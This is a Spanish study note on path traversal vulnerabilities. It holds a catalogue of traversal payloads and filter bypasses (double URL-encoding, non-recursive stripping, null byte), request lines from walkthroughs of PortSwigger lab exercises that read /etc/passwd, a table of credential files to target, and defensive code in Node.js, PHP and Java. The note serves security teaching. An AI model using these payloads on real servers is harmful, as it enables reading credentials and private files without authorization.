---
tags:
  - ciberseguridad
  - web
  - path-traversal
tipo: concepto
estado: terminado
---

# Path Traversal

**Path Traversal** (o *Directory Traversal*) es la vulnerabilidad que ocurre cuando una aplicación incorpora **entrada del usuario dentro de una ruta de archivo** sin validarla, permitiendo que el atacante salga del directorio previsto con secuencias como `../` y acceda a **cualquier archivo legible por el proceso**: `/etc/passwd`, claves SSH, tokens de cloud (`/var/run/secrets/kubernetes.io/...`), código fuente, `.env`, o los propios logs del servidor (puente hacia [[Local File Inclusion]] y [[Log Poisoning]]).

> [!info] Por qué funciona: la resolución de rutas es del SO, no de la app
> El programa solo concatena strings; es el **kernel** quien resuelve la ruta final. En POSIX, un componente `..` significa "directorio padre" y `.` significa "directorio actual", y se resuelven **después** de que la app haya hecho cualquier chequeo sobre el string. Por eso `/var/www/images/../../../etc/passwd` es, para el SO, exactamente igual que `/etc/passwd`: la app validó un prefijo que el kernel descarta al normalizar. Cualquier sanitización hecha *antes* de la resolución final es, en esencia, una sanitización sobre un string que ya no va a existir.

## Mecánica: cómo el sistema operativo resuelve rutas

| Regla POSIX | Ejemplo | Resultado |
|---|---|---|
| `..` sube un nivel | `/var/www/../etc` | `/var/etc` |
| `.` es el directorio actual | `/etc/./passwd` | `/etc/passwd` |
| Barras repetidas colapsan | `/etc//passwd` | `/etc/passwd` |
| Rutas relativas se anclan al CWD del proceso | `../../etc/passwd` | depende del CWD (típico: `/var/www/html`) |
| Rutas absolutas ignoran el prefijo concatenado si el código las detecta | `/etc/passwd` | solo si la app no concatena ciegamente |

En **Windows** las variantes son mayores: el separador puede ser `\` **o** `/` (ambos funcionan en la mayoría de las APIs), existen rutas de dispositivo (`\\.\C:\`, `CON`, `NUL`), prefijos UNC (`\\attacker\share\file`) y rutas alternativas de volumen (`\\?\C:\...`). Un filtro que solo bloquea `../` deja pasar `..\..\<file>`.

> [!tip] Estimación de profundidad (depth)
> Antes de fuzzear, contá los `../` necesarios: si el parámetro es relativo a `/var/www/html/uploads/`, hacen falta **4** saltos (`../../../../etc/passwd`) para llegar a `/`. Truco rápido: empieza con 10× `../` — el exceso de saltos en una raíz es inofensivo (`../` desde `/` sigue en `/`), así confirmas la vulnerabilidad y luego recortas.

## Detección: puntos de inyección y oráculos

Cualquier parámetro que se convierta en ruta es candidato: `file=`, `page=`, `template=`, `img=`, `download=`, `path=`, `document=`, `lang=` (incluidos parámetros ocultos y cookies). Metodología:

1. **Payload canónico**: `../../../etc/passwd` (Linux) o `..\..\..\..\Windows\win.ini` (Windows).
2. **Oráculos de éxito**: contenido canónico del archivo (`root:x:0:0:`), error 200 con binario ilegible, cambio de tamaño de respuesta, o — en LFI — ejecución/interpretación del archivo.
3. **Errores reveladores**: `ENOENT`, stack traces de Java (`java.io.FileNotFoundException`), mensajes de PHP — confirman la ruta base y el número de niveles.
4. **Diferencias sutiles**: a veces el archivo existe pero no es legible (403 vs 404, respuesta vacía vs error). Eso también es información: `../../../../etc/passwd` vacío y `../../../../etc/shadow` con error 500 indica permisos distintos.

Payload mínimo para confirmar:

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```

## Catálogo de payloads

| Contexto | Payload |
|---|---|
| Básico Linux | `../../../../etc/passwd` |
| Básico Windows | `..\..\..\..\Windows\win.ini` |
| URL-encoded | `..%2f..%2f..%2f..%2fetc%2fpasswd` |
| Doble URL-encoding | `..%252f..%252f..%252fetc%252fpasswd` |
| `..%c0%af` (UTF-8 overlong, IIS antiguos) | `..%c0%af..%c0%afetc%c0%afpasswd` |
| Unicode / normalization | `..%u2216..%u2216etc%u2216passwd` (IIS), `..%uFF0F` |
| Filtro no recursivo de `../` | `....//....//....//etc/passwd` |
| Filtro de `..\` en Windows | `..\/..\/etc/passwd` |
| Ruta absoluta (si no concatena prefijo) | `/etc/passwd`, `C:\Windows\win.ini` |
| Null byte (PHP < 5.3.4, C clásico) | `../../../etc/passwd%00.png` |
| Después de filtro de sufijo | `/etc/passwd/.` , `/etc/passwd%00` |
| Globbing (bash/sh) | `/etc/pass*`, `/etc/[p]asswd` |
| Dots alternativos (algunos normalizadores) | `..;/`, `..%00/`, `..%0d/` |

## Bypass de filtros por tipo de filtro

| Filtro implementado | Bypass |
|---|---|
| Bloquea `../` | `..\` (Windows), `%2e%2e%2f`, `....//` |
| `str_replace("../", "")` no recursivo | `....//` → tras una pasada queda `../` |
| Bloquea `%2f` decodificado una vez | `%252f` (doble decode) |
| Exige prefijo `/var/www/images` | `/var/www/images/../../../etc/passwd` |
| Fuerza extensión `.png` | `../../../etc/passwd%00.png` (legacy) o `/etc/passwd/.` |
| Bloquea la palabra `passwd` | `/etc/pass?d` (si el runtime usa glob), `/etc/./passwd`, barras dobles |
| `basename()` del usuario | no elimina la ruta si el código luego **reconcatena** un directorio con la entrada: `basename("a/../../etc/passwd")` = `passwd`, pero si se usa mal (p. ej. validando basename y luego usando la ruta original) sigue expuesto |
| Solo permite extensiones de la allowlist | traversal a un archivo con extensión permitida: `../../app/config.png` no existe… pero `..%00.png` o doble extensión `file.png.php` según motor |

> [!warning] El error clásico: sanitizar y luego confiar
> El patrón vulnerable número uno es: *filtrar `../` → concatenar con directorio base → abrir*. Si el filtro no es **recursivo y normalizado** (iterar hasta que no queden más secuencias, o resolver la ruta completa y re-validar), siempre habrá una composición que lo atraviese. La única corrección robusta es **validar la ruta resuelta**, no el string de entrada (ver Defensas).

## Labs PortSwigger: walkthroughs

### Lab: File path traversal, simple case

Este es un caso simple donde el objetivo es listar el archivo `/etc/passwd`.

![[Pasted image 20250923124439.png]]

Los puntos inyectables usuales son cualquiera de los campos donde podemos pasar información. Podemos usar el que se indica en la imagen para intentar la inyección.

En este caso, vemos que no es posible en ese punto. Otro parámetro que podemos usar es el que carga las imágenes:
![[Pasted image 20250923124722.png]]

Vamos a intentar trasladar esto a la URL para ver si nos permite la inyección:
`GET /image?filename=../../../etc/passwd`
![[Pasted image 20250923125644.png]]

> [!info] Explicación de Path Traversal
> El ataque de *Path Traversal* (también conocido como *Directory Traversal*) permite a un atacante acceder a archivos y directorios que están fuera del directorio raíz de la aplicación web. Esto se logra manipulando variables que hacen referencia a rutas de archivos con secuencias como `../` (punto-punto-barra) para moverse hacia arriba en la jerarquía de directorios. En sistemas Linux/Unix, `/etc/passwd` es un objetivo común ya que contiene información sobre los usuarios del sistema.

Aunque la interfaz muestre "no válido", al regresar a la web principal, la inyección ha sido exitosa:
![[Pasted image 20250923125709.png]]

Lab Terminada.

### Lab: File path traversal, traversal sequences blocked with absolute path bypass

Este laboratorio es similar al anterior, pero indica que las secuencias de *path traversal* están bloqueadas. Sin embargo, se pueden usar rutas absolutas. En este caso, lo que hicimos en el laboratorio anterior también es válido:
![[Pasted image 20250923130005.png]]

Vamos a intentarlo para ver qué obtenemos:
`GET /image?filename=/etc/passwd`
![[Pasted image 20250923130423.png]]
Vemos que en este caso, usar la ruta de forma absoluta es suficiente. Si revisamos:

![[Pasted image 20250923130518.png]]

> [!tip] Bypass de Bloqueo de Secuencias de Traversal
> Cuando las secuencias `../` son bloqueadas, una técnica común es intentar rutas absolutas si el sistema de archivos subyacente es conocido (por ejemplo, `/etc/passwd` en Linux o `C:\Windows\System32\drivers\etc\hosts` en Windows). Esto funciona si la aplicación concatena la ruta proporcionada directamente a la raíz del sistema de archivos en lugar de a un directorio base específico de la aplicación.

Lab terminado.

### Lab: File path traversal, traversal sequences stripped non-recursively

En este laboratorio, tenemos una seguridad mejorada donde ya no se permite el uso de `../`, ya que el sistema de alguna forma lo borra o lo quita. Vamos a verificar:
![[Pasted image 20250923131046.png]]

Vemos que nos sale como no válido. En este punto, una forma que a veces logra engañar al sistema es usar `....//....//....//` (o `..%2f..%2f` si se requiere URL encoding). Esto funciona porque si el filtro no es recursivo, solo eliminará una instancia de `../` en la primera pasada de todas las coincidencias, dejando aún otra secuencia `../` intacta. Vamos a ver si esto funciona:
`GET /image?filename=....//....//....//etc/passwd`
![[Pasted image 20250923131226.png]]

> [!warning] Filtros no Recursivos
> Los filtros de seguridad que eliminan secuencias de *path traversal* deben ser implementados de forma recursiva. Si un filtro solo elimina la primera ocurrencia o no itera hasta que no queden más secuencias, un atacante puede evadirlo duplicando las secuencias, como `....//` que se convierte en `../` después de una pasada no recursiva.

Perfecto, esto sí funcionó. Vamos a ver si con esto completamos el lab:

![[Pasted image 20250923131252.png]]

Lab Terminado.

### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

Al parecer, ahora tenemos más seguridad donde se eliminan las secuencias `...//...//` al usar URL-decode. Vamos a intentar burlar esto:

![[Pasted image 20250923131748.png]]

Vemos que no funciona de forma directa, y nada de lo que conocemos por el momento lo hace. En ocasiones, lo que hacemos es URL-encode de las barras `/` con el objetivo de que el sistema, al hacer un URL-decode, nos lo interprete. Esto puede funcionar haciéndolo solo una vez, donde el URL-encode de `/` es `%2f`. Pero en ocasiones falla y necesitamos también hacer URL-encode al `%`, lo que resultaría en `%25`. Así, la cadena para `/` sería `%252f`.
`GET /image?filename=..%252f..%252f..%252fetc%252fpasswd`
![[Pasted image 20250923132125.png]]

> [!info] Doble URL Encoding para Bypass
> Algunos sistemas de seguridad aplican un URL-decode antes de filtrar las secuencias de *path traversal*. Si un atacante codifica las barras (`/` como `%2f`) y luego codifica el signo de porcentaje (`%` como `%25`), la secuencia `..%252f` se convierte en `../` después de dos pasadas de URL-decode. Esto es efectivo contra filtros que solo realizan un único URL-decode antes de la sanitización.

Perfecto, esto ha funcionado.

![[Pasted image 20250923132143.png]]

Lab Terminado.

### Lab: File path traversal, validation of start of path

En esta ocasión, vamos a ver cómo en la URL se nos obliga a usar la ruta `/var/www/images`. Esto puede parecer una buena idea, pero a la vez no, ya que si no tenemos más que eso, podemos aprovecharnos aún de los `../` para modificarla:
`GET /image?filename=/var/www/images/../../../etc/passwd`
![[Pasted image 20250923132549.png]]

Verifiquemos:

![[Pasted image 20250923132613.png]]

> [!tip] Bypass de Prefijos de Ruta Obligatorios
> Si una aplicación impone un prefijo de ruta obligatorio (ej. `/var/www/images/`), pero no valida la ruta completa después de la concatenación, un atacante puede usar secuencias `../` para "escapar" del directorio impuesto. Por ejemplo, `/var/www/images/../../../etc/passwd` se resuelve a `/etc/passwd` en el sistema de archivos.

Lab Terminada.

### Lab: File path traversal, validation of file extension with null byte bypass

En esta ocasión, se está empleando una forma algo más persistente, y es que concatena siempre la extensión de la imagen al final.

Lo que vamos a hacer en este caso es jugar con el conocido *null byte* (`%00`) que nos permite anular esa concatenación de extensión. Algo a tener en cuenta es que esto funciona en versiones antiguas de PHP y otros lenguajes/sistemas, en lo que respecta a versiones nuevas ya no lo vamos a poder hacer.
`GET /image?filename=../../../etc/passwd%00.png`
![[Pasted image 20250923133121.png]]

Vemos cómo esto ya es posible. Si revisamos:
![[Pasted image 20250923133143.png]]

> [!warning] Vulnerabilidad de Null Byte (`%00`)
> El *null byte* (`%00`) es un carácter especial que, en algunos lenguajes de programación (como C/C++ y versiones antiguas de PHP), marca el final de una cadena. Cuando se utiliza en una ruta de archivo, el sistema operativo o la función de manejo de archivos pueden truncar la cadena en el `%00`, ignorando cualquier carácter posterior. Esto permite a un atacante eludir validaciones de extensión de archivo, por ejemplo, transformando `archivo.txt%00.jpg` en `archivo.txt`. Esta vulnerabilidad ha sido mitigada en versiones modernas de software (PHP cerró esto en 5.3.4, 2010).

Lab Terminado.

## Impacto y cadenas de explotación

| Escenario | Qué se obtiene |
|---|---|
| Lectura de `/etc/passwd` | Confirmación + enumeración de usuarios (luego fuerza bruta SSH) |
| `~/.ssh/id_rsa`, `~/.aws/credentials`, `/var/run/secrets/...` | Acceso directo a infraestructura (RCE indirecta) |
| Archivos de configuración (`.env`, `config.php`, `wp-config.php`) | Credenciales de BD → [[SQL Injection]] o acceso directo a datos |
| Código fuente (`app.py`, `index.php`) | Descubrir [[Inyección NoSQL]], hardcoded secrets, más rutas |
| Logs + intérprete de plantillas/archivos | LFI→RCE vía [[Log Poisoning]] o session files |
| Escritura (menos común: traversal en upload/backup) | Web shell → RCE total |

## Defensas

La única defensa robusta: **resolver la ruta completa y validar que el resultado esté dentro del directorio permitido**. No basta con filtrar `../`.

**Node.js** — `path.resolve` + verificación de prefijo con separador:

```js
const path = require('path');
const fs = require('fs');

const BASE = '/var/www/uploads';

function safeJoin(base, userPath) {
  const resolved = path.resolve(base, userPath);          // normaliza ../ y rutas absolutas
  if (resolved !== base && !resolved.startsWith(base + path.sep)) {
    throw new Error('Path traversal detectado');
  }
  return resolved;                                         // resuelto y dentro de base
}

// además: allowlist de extensiones, y fs.realpath para vencer symlinks
const real = await fs.promises.realpath(safeJoin(BASE, req.query.file));
```

**PHP** — `realpath` + `strpos` estricto (o mejor, allowlist):

```php
<?php
const BASE = '/var/www/uploads';

function safePath(string $user): string {
    $real = realpath(BASE . '/' . $user);   // resuelve ../ y symlinks; false si no existe
    if ($real === false || strpos($real, BASE . '/') !== 0) {
        http_response_code(400);
        exit('Ruta inválida');
    }
    return $real;
}
// Evitar: str_replace('../',''), substr(), regex sin normalizar.
```

**Java** — `Path.normalize` + `startsWith`:

```java
Path base = Paths.get("/var/www/uploads").toRealPath();
Path target = base.resolve(userInput).normalize();
if (!target.startsWith(base)) {           // tras normalize, .. ya no existe en la cadena
    throw new SecurityException("Path traversal");
}
```

Medidas complementarias:

- **Allowlist** de nombres/archivos cuando el conjunto es conocido (`id=3` → buscar en mapa, nunca en disco).
- Ejecutar el proceso con el **mínimo privilegio** de FS (chroot/contenedor, sin acceso a `/etc`, home dirs ni metadata cloud).
- Deshabilitar serving de archivos fuera del docroot; logs fuera del árbol web (ver [[Log Poisoning]]).
- Normalizar también la **entrada** (URL-decode exactamente una vez) antes de comparar; nunca decodificar en bucle.
- WAF como defensa de capa, no como única: reglas `../`, `%2e`, `%252e` son evadibles.

## Errores comunes

**Atacante:**
1. Contar mal la profundidad → probar siempre 10× `../` y luego ajustar.
2. Ignorar Windows: en targets IIS/ASP, `..\` es tan válido como `../`.
3. Olvidar que el parámetro puede estar en cookies, headers (`X-File-Path`), JSON body o POST multipart filename.
4. Asumir que "respuesta 200 = lectura correcta": verificar el contenido (¿es realmente `/etc/passwd` o un error HTML con 200?).
5. Usar `%00` en PHP moderno y concluir erróneamente que no hay traversal (el null byte ya no trunca).

**Defensor:**
1. Filtrar `../` en vez de validar la ruta resuelta (bypass: `....//`, `%2e%2e/`, absoluto, `..\`).
2. Validar al inicio y volver a concatenar user input después (`$base . $user` tras el chequeo).
3. Olvidar `realpath` → symlinks dentro del docroot apuntando a `/etc` burlan cualquier validación de string.
4. Comparar prefijos sin separador: `/var/www/uploads-evil`.startsWith(`/var/www/uploads`) → true.
5. Creer que un límite de longitud o una extensión forzada mitigan el traversal (solo complican el payload).

## Cheatsheet

| Concepto | Valor |
|---|---|
| Payload universal de prueba | `../../../../../../etc/passwd` (Linux) / `..\..\..\..\Windows\win.ini` (Win) |
| Oráculos de éxito | `root:x:0:0:`, binario ilegible, stack trace, ejecución del archivo |
| Filtro no recursivo | `....//` |
| Doble decode | `..%252f` |
| Exceso de `../` | inofensivo en `/`; sirve para no estimar profundidad |
| Null byte | solo legacy (< PHP 5.3.4, C sin checks) |
| Defensa correcta | `resolve+normalize` y verificar pertenencia al base dir (con `realpath` contra symlinks) |
| Defensa falsa | `str_replace('../','')`, regex sin normalizar, excluir caracteres |

## Referencias

- PortSwigger Web Security Academy — File path traversal: https://portswigger.net/web-security/file-path-traversal
- OWASP Path Traversal (CWE-22): https://owasp.org/www-community/attacks/Path_Traversal
- HackTricks — Path Traversal / File Inclusion: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
- PayloadsAllTheThings — Directory Traversal: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

## Relacionadas

- [[Local File Inclusion]] — el mismo vector aplicado a la inclusión/intepretación de archivos (wrappers, RCE)
- [[Log Poisoning]] — combinar lectura de logs con intérprete para escalar a RCE
- [[Abuso de Subida de Archivos]] — traversal en el nombre del archivo subido para escribir fuera del directorio
- [[Insecure Direct Object References IDOR]] — traversal sobre IDs de objetos en vez de rutas del FS
- [[OS Command Injection]] — si la ruta viaja a un shell, la misma entrada permite inyección de comandos
- [[XML External Entity Injection]] — XXE permite lectura de archivos locales con otra semántica
